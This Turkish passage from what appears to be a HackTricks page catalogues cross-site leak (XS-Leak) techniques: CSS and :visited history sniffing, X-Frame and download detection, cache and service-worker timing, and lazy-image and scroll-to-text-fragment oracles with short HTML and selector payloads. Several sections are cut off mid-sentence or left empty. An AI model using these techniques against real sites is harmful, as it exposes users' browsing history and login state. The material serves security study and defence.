* **Özet:** Kullanıcının durumu veya durumuyla ilişkili web sitesi stilindeki değişiklikleri belirleyin.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, kullanıcının durumuna bağlı olarak **web sitesi stilini değiştirebilir**. Çapraz kökenli CSS dosyaları, **HTML link elemanı** ile saldırgan sayfaya gömülebilir ve **kurallar** saldırgan sayfaya **uygulanır**. Bir sayfa bu kuralları dinamik olarak değiştiriyorsa, bir saldırgan kullanıcı durumuna bağlı olarak bu farkları **tespit** edebilir.\
Bir sızıntı tekniği olarak, saldırgan, etkilenen elemanın ve özellik adının bilindiği takdirde, `window.getComputedStyle` yöntemini kullanarak belirli bir HTML elemanının CSS özelliklerini **okuyabilir**. Sonuç olarak, bir saldırgan etkilenen elemanın herhangi bir CSS özelliğini okuyabilir.

### CSS Geçmişi

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Tespit Edilebilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Özet:** `:visited` stilinin bir URL'ye uygulandığını tespit ederek daha önce ziyaret edildiğini belirleyin
* **Kod Örneği**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
[**Burada**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) belirtildiğine göre, bu headless Chrome'da çalışmamaktadır.
{% endhint %}

CSS `:visited` seçicisi, kullanıcı tarafından daha önce ziyaret edilen URL'leri farklı şekilde biçimlendirmek için kullanılır. Geçmişte, `getComputedStyle()` yöntemi bu stil farklarını belirlemek için kullanılabilirdi. Ancak, modern tarayıcılar, bu yöntemin bir bağlantının durumunu ortaya çıkarmasını önlemek için güvenlik önlemleri uygulamıştır. Bu önlemler, her zaman bağlantının ziyaret edilmiş gibi hesaplanmış stilini döndürmek ve `:visited` seçicisi ile uygulanabilecek stilleri sınırlamak gibi şeyleri içerir.

Bu kısıtlamalara rağmen, bir bağlantının ziyaret edilmiş durumunu dolaylı olarak belirlemek mümkündür. Bir teknik, kullanıcıyı CSS tarafından etkilenen bir alana etkileşimde bulunmaya kandırmakla ilgilidir, özellikle `mix-blend-mode` özelliğini kullanarak. Bu özellik, öğelerin arka planlarıyla karıştırılmasına izin verir ve kullanıcı etkileşimine bağlı olarak ziyaret edilmiş durumu ortaya çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmaksızın da tespit gerçekleştirilebilir, bağlantıların render süreleri sömürülerek. Tarayıcılar ziyaret edilmiş ve edilmemiş bağlantıları farklı şekilde render edebileceğinden, bu, render süres
### ContentDocument X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Başlıklar
* **Daha fazla bilgi**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Özet**: Google Chrome'da, X-Frame-Options kısıtlamaları nedeniyle çapraz kaynak siteye gömülmesi engellenen bir sayfa için özel bir hata sayfası görüntülenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Chrome'da, "X-Frame-Options" başlığı "deny" veya "same-origin" olarak ayarlanmış bir sayfa bir nesne olarak gömülüyorsa, bir hata sayfası görünür. Chrome, bu nesnenin `contentDocument` özelliği için diğer iframe'ler veya diğer tarayıcılardan farklı olarak boş bir belge nesnesi (null yerine) döndürür. Saldırganlar, boş belgeyi algılayarak, geliştiricilerin X-Frame-Options başlığını tutarsız bir şekilde ayarlaması durumunda (hata sayfalarını genellikle göz ardı ederek), kullanıcının durumu hakkında bilgi ortaya çıkarabilir. Bu tür sızıntıları önlemek için güvenlik başlıklarının farkında olunması ve tutarlı bir şekilde uygulanması önemlidir.


### İndirme Algılama

* **Dahil Etme Yöntemleri**: Frames, Açılır Pencereler
* **Algılanabilir Fark**: Başlıklar
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Özet**: Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilir olması, başarılı bir dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` başlığı, özellikle `Content-Disposition: attachment`, tarayıcıya içeriği içe aktarmak yerine indirmesini talimat verir. Bu davranış, bir kullanıcının bir dosya indirme tetikleyen bir sayfaya erişiminin olup olmadığını tespit etmek için istismar edilebilir. Chromium tabanlı tarayıcılarda, bu indirme davranışını tespit etmek için birkaç teknik bulunmaktadır:

1. **İndirme Çubuğu İzleme**:
- Chromium tabanlı tarayıcılarda bir dosya indirildiğinde, tarayıcının altında bir indirme çubuğu görünür.
- Saldırganlar, pencere yüksekliğindeki değişiklikleri izleyerek indirme çubuğunun görünümünü çıkarabilir ve bir indirme başlatıldığını ima edebilir.

2. **Iframe ile İndirme Gezinmesi**:
- Bir sayfa, `Content-Disposition: attachment` başlığını kullanarak bir dosya indirmesini tetiklediğinde, bir gezinme olayına neden olmaz.
- İçeriği bir iframe içinde yükleyerek ve gezinme olaylarını izleyerek, içerik düzeninin bir dosya indirmesine neden olup olmadığını kontrol etmek mümkündür (gezinme olmaz).

3. **Iframe Olmadan İndirme Gezinmesi**:
- Iframe tekniğiyle benzer şekilde, bu yöntem bir iframe yerine `window.open` kullanmayı içerir.
- Yeni açılan penceredeki gezinme olaylarını izleyerek, bir dosya indirilip indirilmediği (gezinme olmaz) veya içeriğin içe aktarıldığı (gezinme gerçekleşir) ortaya çıkarılabilir.

Yalnızca oturum açmış kullanıcıların böyle indirmeleri tetikleyebildiği senaryolarda, bu teknikler, tarayıcının indirme isteğine verdiği yanıta dayanarak dolaylı olarak kullanıcının kimlik doğrulama durumunu çıkarabilmek için kullanılabilir.

### Bölümlenmiş HTTP Önbelleği Atlama <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Özet**: Bir saldırgan, iframe'leri kullanarak dosya indirmelerini ayırt edebilir; iframe'in sürekli erişilebilir olması, başarılı bir dosya indirmesini ima eder.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (kaynak: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Bu teknik neden ilginç: Chrome şimdi **önbelleği bölmektedir** ve yeni açılan sayfanın önbellek anahtarı şudur: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ancak bir ngrok sayfası açarsam ve içinde fetch kullanırsam, önbellek anahtarı şu şekilde olacaktır: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **önbellek anahtarı farklıdır**, bu nedenle önbellek paylaşılamaz. Daha fazla ayrıntıyı burada bulabilirsiniz: [Önbelleği bölmekle güvenlik ve gizlilik kazanma](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Yorum [**buradan**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Eğer bir site `example.com`, `*.example.com/resource` kaynağını içeriyorsa, o kaynak, kaynağın doğrudan **üst düzey gezinme** ile istendiği gibi **aynı önbellekleme anahtarına** sahip olacaktır. Çünkü önbelleğe erişmek, bir kaynağı yüklemekten daha hızlıdır, bu nedenle bir sayfanın konumunu değiştirmeye ve durduktan 20ms sonra iptal etmeye çalışmak mümkündür. Eğer durduktan sonra köken değiştiyse, kaynağın önbelleklendiği anlamına gelir.\
Veya sadece **potansiyel olarak önbelleğe alınmış sayfaya bazı fetch istekleri gönderip, alınan zamanı ölçebilirsiniz**.

### Manuel Yönlendirme <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirmeler
* **Daha fazla bilgi**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
*
### Script Kirliliği

* **Dahil Etme Yöntemleri**: HTML Elemanları (script)
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Özet:** Dahili fonksiyonları **üzerine yazmak** ve hatta **çapraz kaynaklı betikten** (doğrudan okunamayan) argümanlarını okumak mümkündür, bu değerli bilgilerin **sızmasına** neden olabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Hizmet İşçileri <a href="#service-workers" id="service-workers"></a>

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Özet:** Bir web sitesinin yürütme süresini ölçmek için hizmet işçileri kullanılır.
* **Kod Örneği**:

Verilen senaryoda saldırgan, "attacker.com" adlı bir alan adında bir **hizmet işçisi** kaydeder. Ardından, saldırgan hedef web sitesindeki ana belgeden yeni bir pencere açar ve **hizmet işçisine** bir zamanlayıcı başlatmasını söyler. Yeni pencere yüklenmeye başladığında, saldırgan önceki adımda elde edilen referansı **hizmet işçisi** tarafından yönetilen bir sayfaya yönlendirir.

Önceki adımda başlatılan isteğin varışında, **hizmet işçisi** etkin bir şekilde gezinme sürecini sonlandıran bir **204 (İçerik Yok)** durum koduyla yanıt verir. Bu noktada, **hizmet işçisi** önceki adımda başlatılan zamanlayıcıdan bir ölçüm yakalar. Bu ölçüm, gezinme sürecinde gecikmelere neden olan JavaScript'in süresinden etkilenir.

{% hint style="warning" %}
Bir yürütme zamanlamasında **ağ faktörlerini ortadan kaldırmak** ve **daha kesin ölçümler** elde etmek mümkündür. Örneğin, sayfanın yüklenmeden önce kullandığı kaynakları yükleyerek.
{% endhint %}

### Fetch Zamanlaması

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Özet:** Bir isteğin gerçekleştirilmesi için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanılır. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Çapraz Pencere Zamanlaması

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Zamanlama (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
* **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Özet:** `window.open` kullanarak bir isteğin gerçekleştirilmesi için geçen süreyi ölçmek için [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) kullanılır. Diğer saatler de kullanılabilir.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen ve **iş akışlarını otomatikleştirmenize** olanak sağlayan [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## HTML veya Re Enjeksiyonu ile

Burada, çapraz kaynaklı bir HTML'den bilgi çalmak için **HTML içeriği enjekte eden teknikleri** bulabilirsiniz. Bu teknikler, herhangi bir nedenle **JS kodu enjekte edememeniz** durumunda ilginç olabilir.

### Sarkan İşaretleme

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Görüntü Tembel Yükleme

İçeriği **çalmak** ve gizli bilgiden önce **HTML ekleyebiliyorsanız**, **sarkan işaretleme tekniklerini** kontrol etmelisiniz.\
Ancak, herhangi bir nedenden dolayı **her karakteri ayrı ayrı** yapmanız gerekiyorsa (belki iletişim önbellek vuruşuyla gerçekleşiyorsa) bu hileyi kullanabilirsiniz.

HTML'deki **görüntülerin** bir "**yükleme**" özniteliği vardır ve değeri "**lazy**" olabilir. Bu durumda, görüntü yalnızca görüntülendiğinde yüklenir ve sayfa yüklenirken değil:
```html
<img src=/something loading=lazy >
```
Bu nedenle yapabileceğiniz şey, gizli olanın önüne **çok fazla gereksiz karakter eklemek** (Örneğin **binlerce "W"**) veya `<br><canvas height="1850px"></canvas><br>` gibi bir şey eklemektir.\
Öyleyse örneğin **enjeksiyonumuz bayrağın önünde görünüyorsa**, **resim yüklenecektir**, ancak bayraktan sonra görünüyorsa bayrak + gereksiz karakterler **yükleme işlemini engelleyecektir** (ne kadar gereksiz karakter yerleştireceğinizle oynamanız gerekecektir). Bu, [**bu yazıda**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) olan şeydir.

Başka bir seçenek ise, izin veriliyorsa **scroll-to-text-fragment** kullanmaktır:

#### Scroll-to-text-fragment

Ancak, **botun sayfaya erişmesini sağlarsınız** ve bunu şu şekilde yaparsınız:
```
#:~:text=SECR
```
Web sayfası şuna benzer olacak: **`https://victim.com/post.html#:~:text=SECR`**

Post.html, saldırganın gereksiz karakterlerini ve tembel yükleme resmini içerir ve ardından botun sırrı eklenir.

Bu metin, botun, sayfadaki `SECR` metnini içeren herhangi bir metne erişmesini sağlar. Bu metin sır olduğu için ve sadece **resmin altında** olduğu için, **resim yalnızca tahmin edilen sır doğruysa yüklenecektir**. Böylece, karakter karakter sırrı **dışarı sızdırmanızı sağlayacak bir oracle** elde edersiniz.

Bunu sömürmek için bazı kod örnekleri: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Gecikmeli Resim Yükleme Zamanına Dayalı Saldırı

Eğer **dışarıdan bir resim yüklemek mümkün değilse** ve bu, saldırganın resmin yüklendiğini göstermesi gerekiyorsa, başka bir seçenek de **karakteri birkaç kez tahmin etmek ve bunu ölçmektir**. Eğer resim yüklenirse, tüm istekler yüklenmezse daha uzun sürecektir. Bu, [**bu çözümde**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) kullanılan şeydir.

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Eğer `jQuery(location.hash)` kullanılıyorsa, bazı HTML içeriğinin var olup olmadığını zamanlama ile bulmak mümkündür. Bu, `main[id='site-main']` seçicisi eşleşmiyorsa, geri kalan **seçicileri kontrol etmesine gerek olmadığı** için böyledir.
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Enjeksiyonu

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Savunmalar

[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) adresinde önerilen önlemler bulunmaktadır. Ayrıca [https://xsleaks.dev/](https://xsleaks.dev/) adresindeki her bölümde de bu tekniklere karşı nasıl korunulacağı hakkında daha fazla bilgi bulabilirsiniz.

## Referanslar

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturup otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
